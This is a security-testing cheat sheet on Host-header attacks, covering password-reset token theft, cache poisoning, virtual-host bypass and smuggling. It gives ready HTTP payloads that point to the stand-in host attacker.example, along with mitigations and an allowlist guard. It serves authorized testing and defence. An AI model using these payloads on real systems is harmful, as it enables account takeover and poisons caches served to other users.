# 🧭 Host Header Attack Cheat Sheet

> **Scope:** use these techniques only against systems you are explicitly authorized to test.
> Quick reference for Host-header abuse, virtual-host confusion and proxy/cache poisoning.

---

## 🔎 1. What the Host header controls

The `Host` header tells a web server which virtual host should handle a request. It is also commonly trusted by applications and intermediary layers for:

- Generating absolute URLs in password-reset emails
- Building redirects and canonical links
- Selecting cache keys or CDN routing rules
- Deciding which backend/tenant receives the request
- Logging and access-control decisions

When any of those trust the client-supplied value without validation, the Host header becomes an attack surface.

---

## 🧪 2. Basic detection

Send a request with an unexpected Host value and compare the response.

```http
GET / HTTP/1.1
Host: <TARGET>
Connection: close
```

```http
GET / HTTP/1.1
Host: attacker.example
Connection: close
```

Things to look for:

| Observation | Possible issue |
|-------------|----------------|
| Different HTML/title | Virtual host routing is driven by Host |
| Absolute URL in response contains your value | URL generation trusts Host |
| Redirect `Location` contains your value | Open redirect / poisoned link |
| Cache key changes or ignores input | Cache-poisoning surface |
| Password-reset email points to your domain | Password-reset poisoning |

---

## 🎯 3. Common payload variants

### Standard override

```http
Host: attacker.example
```

### Absolute-form request target

```http
GET http://attacker.example/ HTTP/1.1
Host: <TARGET>
```

### Duplicate Host headers

```http
GET / HTTP/1.1
Host: <TARGET>
Host: attacker.example
```

Different stacks pick the first, last, or reject duplicates. This is useful for finding front/back-end parser differences.

### Port and whitespace tricks

```http
Host: <TARGET>:80
Host: <TARGET>
Host:  <TARGET>
Host: <TARGET>.
Host: [<TARGET>]
Host: <TARGET>\t@attacker.example
```

### Header injection via trusted proxies

Many apps rebuild URLs from proxy headers rather than `Host`:

```http
X-Forwarded-Host: attacker.example
X-Original-Host: attacker.example
X-Host: attacker.example
X-Forwarded-Server: attacker.example
Forwarded: host=attacker.example
```

Test each independently and in combination with a normal `Host`.

---

## 🔐 4. Password-reset poisoning

Typical flow:

1. Request a password reset for a victim account.
2. Intercept the request and replace `Host` with a domain you control.
3. If the emailed link uses that host, the victim who clicks it leaks their reset token to your server.

```http
POST /forgot-password HTTP/1.1
Host: attacker.example
Content-Type: application/x-www-form-urlencoded

username=<USER>
```

Then watch the attacker-controlled server for a request such as:

```text
GET /reset?token=<TOKEN> HTTP/1.1
Host: attacker.example
```

Impact: full account takeover when the token is still valid and not bound to the original session.

Mitigation checks:

- Use a configured canonical origin, not the request Host
- Bind reset tokens to the intended user and invalidate on use
- Require the token and a session/email confirmation together

---

## 🔁 5. Cache poisoning through Host

A cache can be poisoned when it keys responses on a normalized or internal host while the origin generates content from a different header.

```http
GET / HTTP/1.1
Host: attacker.example
X-Forwarded-Host: attacker.example
```

If a cached page contains `attacker.example` in script URLs, redirects, or asset links, every visitor served that cache entry can be attacked.

Useful workflow:

1. Identify a cacheable path (`/`, `/en/`, static-looking routes).
2. Add candidate headers one at a time.
3. Look for reflection in the body or `Location`.
4. Send twice and confirm the second response is a cache hit.
5. Load the URL from a clean client to confirm the poisoned response is served.

Do not poison production or shared systems outside your authorization.

---

## 🧱 6. Virtual-host and tenant bypass

Applications may use Host to select a tenant, language, or admin panel.

```http
GET /admin HTTP/1.1
Host: admin.<TARGET>
```

```http
GET / HTTP/1.1
Host: internal.<TARGET>
```

Bypass ideas:

- Case variation: `ADMIN.<TARGET>`
- Trailing dot: `admin.<TARGET>.`
- Alternate domains resolving to the same IP
- Using `X-Forwarded-Host` while keeping a legitimate `Host`
- Combining with path normalization: `/admin/../admin`

Impact can include exposing an internal virtual host, bypassing host-based ACLs, or reaching a tenant you are not authorized for.

---

## ⚙️ 7. TLS, SNI and proxy mismatches

Modern stacks may validate Host at the TLS layer but trust a different header at the application layer.

Test matrix:

| Layer | Value to check |
|-------|----------------|
| TLS SNI | `<TARGET>` |
| HTTP Host | `attacker.example` |
| `X-Forwarded-Host` | `attacker.example` |
| Backend Host | often rewritten by the reverse proxy |

Tools such as `curl --resolve`, Burp, and custom TLS clients help keep SNI and Host independent:

```bash
curl -k --resolve <TARGET>:443:<IP> \
  -H 'Host: attacker.example' \
  https://<TARGET>/
```

---

## 🧨 8. Interaction with request smuggling

A Host-header discrepancy is often a symptom of front/back-end parsing differences, which can also enable request smuggling.

```http
GET / HTTP/1.1
Host: <TARGET>
Content-Length: 4
Transfer-Encoding: chunked

0

```

See `Request-Smuggling.md` for CL.TE / TE.CL techniques. Always test timing and side effects carefully on authorized targets only.

---

## 🛡️ 9. Mitigation

| Control | What to do |
|---------|------------|
| Canonical origin | Configure a fixed scheme + host + port; never build URLs from raw Host |
| Allowlist | Accept only known Host values at the edge and application |
| Reject ambiguity | Reject duplicate Host headers and absolute-form requests unless required |
| Proxy headers | Strip or overwrite `X-Forwarded-Host`, `X-Host`, `Forwarded`, etc. |
| Cache keys | Include the exact trusted origin in the cache key; do not key on attacker-controlled variants |
| Reset links | Use canonical URLs and bind tokens to user/session |
| Virtual hosts | Do not use Host alone for authentication or tenant isolation |
| Logging | Log both the raw Host and the effective normalized host |

Example Express-style guard:

```js
const ALLOWED_HOSTS = new Set(['app.example.com']);

app.use((req, res, next) => {
  const host = req.headers.host?.split(':')[0].toLowerCase();
  if (!ALLOWED_HOSTS.has(host)) {
    return res.status(400).json({ error: 'Invalid Host header' });
  }
  req.canonicalOrigin = 'https://app.example.com';
  next();
});
```

---

## ✅ 10. Testing checklist

- [ ] Send an arbitrary Host and inspect body, redirects, and absolute URLs
- [ ] Test duplicate Host headers
- [ ] Test absolute-form request targets
- [ ] Test `X-Forwarded-Host`, `X-Host`, `X-Original-Host`, `Forwarded`
- [ ] Test trailing dot, uppercase, port suffix, bracketed IPv6 forms
- [ ] Check password-reset link generation
- [ ] Check cacheability and cache-key behavior
- [ ] Check virtual-host and tenant isolation
- [ ] Check SNI vs Host vs proxy-header consistency
- [ ] Confirm every finding only on an authorized target

---

## 🧰 11. Quick reference

| Goal | Request idea |
|------|--------------|
| Reflect attacker host | `Host: attacker.example` |
| Proxy-header override | `X-Forwarded-Host: attacker.example` |
| Parser confusion | Duplicate `Host` headers |
| Absolute URL confusion | `GET http://attacker.example/ HTTP/1.1` |
| Reset poisoning | Change Host on forgot-password POST |
| Cache poisoning | Poisonable header + cacheable path |
| Virtual-host bypass | `Host: internal.<TARGET>` |

---

## 📚 References

- [PortSwigger: Host header attacks](https://portswigger.net/web-security/host-header)
- [OWASP: Host Header Attack](https://owasp.org/www-community/attacks/Host_header_attack)
- [RFC 9110 — Host header field](https://www.rfc-editor.org/rfc/rfc9110#section-7.2)
- [PortSwigger: Web cache poisoning](https://portswigger.net/web-security/web-cache-poisoning)

---

**🧭 Happy authorized testing!**
